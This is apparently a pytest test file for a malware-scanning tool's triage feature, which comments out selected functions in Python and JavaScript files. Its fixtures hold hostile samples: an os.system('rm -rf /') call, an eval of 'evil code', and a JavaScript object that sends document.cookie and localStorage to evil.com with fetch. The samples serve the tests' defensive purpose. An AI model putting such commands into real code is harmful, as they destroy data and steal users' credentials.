"""Test triage commenting functionality."""

import tempfile
from pathlib import Path

import pytest

from common.malwi_object import MalwiObject
from common.malwi_report import comment_out_code_sections


def test_comment_out_specific_lines():
    """Test that objects are written to file with specified ones commented out."""
    test_code = '''import os
import subprocess

def benign_function():
    """This is a benign function that was misclassified."""
    x = 1 + 1
    return x

def malicious_function():
    """This is actually malicious."""
    os.system("rm -rf /")
    subprocess.call(["evil", "command"])

def another_function():
    y = 2 + 2
    print(f"Result: {y}")
    return y
'''

    # Create temporary file
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)

    try:
        # Create MalwiObjects for all functions
        benign_obj = MalwiObject(
            name="benign_function",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code='def benign_function():\n    """This is a benign function that was misclassified."""\n    x = 1 + 1\n    return x',
        )

        malicious_obj = MalwiObject(
            name="malicious_function",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code='def malicious_function():\n    """This is actually malicious."""\n    os.system("rm -rf /")\n    subprocess.call(["evil", "command"])',
        )

        all_objects = [benign_obj, malicious_obj]
        objects_to_comment = [benign_obj]

        # Comment out only the benign object
        result = comment_out_code_sections(temp_path, all_objects, objects_to_comment)
        assert result is True

        # Read the modified file
        modified_content = temp_path.read_text()
        lines = modified_content.split("\n")

        # Check that benign function is commented, malicious is not
        assert lines[0] == "# def benign_function():"  # Commented
        assert (
            lines[1] == '#     """This is a benign function that was misclassified."""'
        )  # Commented
        assert lines[2] == "#     x = 1 + 1"  # Commented
        assert lines[3] == "#     return x"  # Commented
        assert lines[5] == "def malicious_function():"  # Not commented
        assert lines[6] == '    """This is actually malicious."""'  # Not commented

    finally:
        temp_path.unlink()


def test_comment_out_javascript_file():
    """Test that JavaScript files use correct comment prefix."""
    test_code = """function maliciousFunc() {
    eval("evil code");
}

function benignFunc() {
    console.log("hello");
    return 42;
}"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)

    try:
        # Create MalwiObjects for both functions
        malicious_obj = MalwiObject(
            name="maliciousFunc",
            language="javascript",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code='function maliciousFunc() {\n    eval("evil code");\n}',
        )

        benign_obj = MalwiObject(
            name="benignFunc",
            language="javascript",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code='function benignFunc() {\n    console.log("hello");\n    return 42;\n}',
        )

        all_objects = [malicious_obj, benign_obj]
        objects_to_comment = [benign_obj]

        result = comment_out_code_sections(temp_path, all_objects, objects_to_comment)
        assert result is True

        # Read the modified file
        modified_content = temp_path.read_text()
        lines = modified_content.split("\n")

        # Check that malicious function is not commented, benign function is commented
        assert lines[0] == "function maliciousFunc() {"  # Not commented
        assert lines[1] == '    eval("evil code");'  # Not commented
        assert lines[2] == "}"  # Not commented
        assert lines[4] == "// function benignFunc() {"  # Commented
        assert lines[5] == '//     console.log("hello");'  # Commented
        assert lines[6] == "//     return 42;"  # Commented
        assert lines[7] == "// }"  # Commented

    finally:
        temp_path.unlink()


def test_comment_out_multiple_benign_objects():
    """Test that multiple benign objects are commented out while others remain unchanged."""
    test_code = """def func1():
    return 1

def func2():
    return 2

x = "some variable"
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)

    try:
        # Create objects for all code sections
        obj1 = MalwiObject(
            name="func1",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="def func1():\n    return 1",
        )

        obj2 = MalwiObject(
            name="func2",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="def func2():\n    return 2",
        )

        obj3 = MalwiObject(
            name="variable",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code='x = "some variable"',
        )

        all_objects = [obj1, obj2, obj3]
        objects_to_comment = [obj1, obj2]  # Comment out both functions but not variable

        result = comment_out_code_sections(temp_path, all_objects, objects_to_comment)
        assert result is True

        modified_content = temp_path.read_text()
        lines = modified_content.split("\n")

        # Check that functions are commented, variable is not
        assert lines[0] == "# def func1():"  # Commented
        assert lines[1] == "#     return 1"  # Commented
        assert lines[3] == "# def func2():"  # Commented
        assert lines[4] == "#     return 2"  # Commented
        assert lines[6] == 'x = "some variable"'  # Not commented

    finally:
        temp_path.unlink()


def test_empty_benign_objects_list():
    """Test that function handles empty objects list."""
    test_code = "def test():\n    pass\n"

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)

    try:
        # Test with empty list - should create empty file
        result = comment_out_code_sections(temp_path, [])
        assert result is True

        # File should be empty since no objects were provided
        content = temp_path.read_text()
        assert content == ""

    finally:
        temp_path.unlink()


def test_source_code_with_whitespace():
    """Test handling source_code with whitespace and empty lines."""
    test_code = """def func():

    x = 1

    return x
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)

    try:
        benign_obj = MalwiObject(
            name="func",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="def func():\n\n    x = 1\n\n    return x",
        )

        all_objects = [benign_obj]
        objects_to_comment = [benign_obj]

        result = comment_out_code_sections(temp_path, all_objects, objects_to_comment)
        assert result is True

        modified_content = temp_path.read_text()
        lines = modified_content.split("\n")

        # All lines should be commented since this object is in objects_to_comment
        assert lines[0] == "# def func():"  # Commented
        assert lines[1] == "#"  # Empty line commented
        assert lines[2] == "#     x = 1"  # Commented
        assert lines[3] == "#"  # Empty line commented
        assert lines[4] == "#     return x"  # Commented

    finally:
        temp_path.unlink()


def test_comment_out_multiline_structure():
    """Test handling multi-line structures like class definitions with arrays."""
    test_code = """from ctypes import Structure, wintypes, POINTER, c_char

class DATA_BLOB(Structure):
    _fields_=[
('cbData',wintypes.DWORD),
('pbData',POINTER(c_char))
]

def other_function():
    return 42
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)

    try:
        # Create objects for all code sections
        import_obj = MalwiObject(
            name="imports",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="from ctypes import Structure, wintypes, POINTER, c_char",
        )

        class_obj = MalwiObject(
            name="DATA_BLOB",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="""class DATA_BLOB(Structure):
    _fields_=[
('cbData',wintypes.DWORD),
('pbData',POINTER(c_char))
]""",
        )

        func_obj = MalwiObject(
            name="other_function",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="def other_function():\n    return 42",
        )

        all_objects = [import_obj, class_obj, func_obj]
        objects_to_comment = [class_obj]  # Only comment the class

        result = comment_out_code_sections(temp_path, all_objects, objects_to_comment)
        assert result is True

        modified_content = temp_path.read_text()
        lines = modified_content.split("\n")

        # Import should not be commented, class should be commented, function should not be
        assert (
            lines[0] == "from ctypes import Structure, wintypes, POINTER, c_char"
        )  # Not commented
        assert lines[2] == "# class DATA_BLOB(Structure):"  # Commented
        assert lines[3] == "#     _fields_=["  # Commented
        assert lines[4] == "# ('cbData',wintypes.DWORD),"  # Commented
        assert lines[5] == "# ('pbData',POINTER(c_char))"  # Commented
        assert lines[6] == "# ]"  # Commented
        assert lines[8] == "def other_function():"  # Not commented
        assert lines[9] == "    return 42"  # Not commented

    finally:
        temp_path.unlink()


def test_comment_out_multiple_closing_brackets():
    """Test that multiple closing brackets are properly commented out."""
    test_code = """nested_list = [
    [1, 2, 3],
    [4, 5, 6]
]

def other_function():
    return 42
"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)

    try:
        # Create objects for both code sections
        list_obj = MalwiObject(
            name="nested_list",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="""nested_list = [
    [1, 2, 3],
    [4, 5, 6]
]""",
        )

        func_obj = MalwiObject(
            name="other_function",
            language="python",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="def other_function():\n    return 42",
        )

        all_objects = [list_obj, func_obj]
        objects_to_comment = [list_obj]  # Only comment the nested list

        result = comment_out_code_sections(temp_path, all_objects, objects_to_comment)
        assert result is True

        modified_content = temp_path.read_text()
        lines = modified_content.split("\n")

        # List should be commented, function should not be
        assert lines[0] == "# nested_list = ["  # Commented
        assert lines[1] == "#     [1, 2, 3],"  # Commented
        assert lines[2] == "#     [4, 5, 6]"  # Commented
        assert lines[3] == "# ]"  # Commented
        assert lines[5] == "def other_function():"  # Not commented
        assert lines[6] == "    return 42"  # Not commented

    finally:
        temp_path.unlink()


def test_comment_out_javascript_multiline_object():
    """Test commenting out JavaScript objects with nested structures."""
    test_code = """const maliciousConfig = {
    payload: {
        url: "https://evil.com/steal",
        method: "POST",
        data: {
            credentials: document.cookie,
            localStorage: JSON.stringify(localStorage)
        }
    },
    execute: function() {
        fetch(this.payload.url, {
            method: this.payload.method,
            body: JSON.stringify(this.payload.data)
        });
    }
};

function normalFunction() {
    console.log("This is normal");
    return 42;
}"""

    with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
        f.write(test_code)
        temp_path = Path(f.name)

    try:
        # Create objects for both code sections
        config_obj = MalwiObject(
            name="maliciousConfig",
            language="javascript",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="""const maliciousConfig = {
    payload: {
        url: "https://evil.com/steal",
        method: "POST",
        data: {
            credentials: document.cookie,
            localStorage: JSON.stringify(localStorage)
        }
    },
    execute: function() {
        fetch(this.payload.url, {
            method: this.payload.method,
            body: JSON.stringify(this.payload.data)
        });
    }
};""",
        )

        func_obj = MalwiObject(
            name="normalFunction",
            language="javascript",
            file_path=str(temp_path),
            file_source_code=test_code,
            source_code="""function normalFunction() {
    console.log("This is normal");
    return 42;
}""",
        )

        all_objects = [config_obj, func_obj]
        objects_to_comment = [config_obj]  # Only comment the malicious config

        result = comment_out_code_sections(temp_path, all_objects, objects_to_comment)
        assert result is True

        modified_content = temp_path.read_text()
        lines = modified_content.split("\n")

        # Verify JavaScript-style commenting for config, normal function unchanged
        assert lines[0] == "// const maliciousConfig = {"
        assert lines[1] == "//     payload: {"
        assert lines[2] == '//         url: "https://evil.com/steal",'
        assert lines[3] == '//         method: "POST",'
        assert lines[4] == "//         data: {"
        assert lines[5] == "//             credentials: document.cookie,"
        assert lines[6] == "//             localStorage: JSON.stringify(localStorage)"
        assert lines[7] == "//         }"
        assert lines[8] == "//     },"
        assert lines[9] == "//     execute: function() {"
        assert lines[10] == "//         fetch(this.payload.url, {"
        assert lines[11] == "//             method: this.payload.method,"
        assert lines[12] == "//             body: JSON.stringify(this.payload.data)"
        assert lines[13] == "//         });"
        assert lines[14] == "//     }"
        assert lines[15] == "// };"
        assert lines[17] == "function normalFunction() {"  # Not commented
        assert lines[18] == '    console.log("This is normal");'  # Not commented
        assert lines[19] == "    return 42;"  # Not commented
        assert lines[20] == "}"  # Not commented

    finally:
        temp_path.unlink()
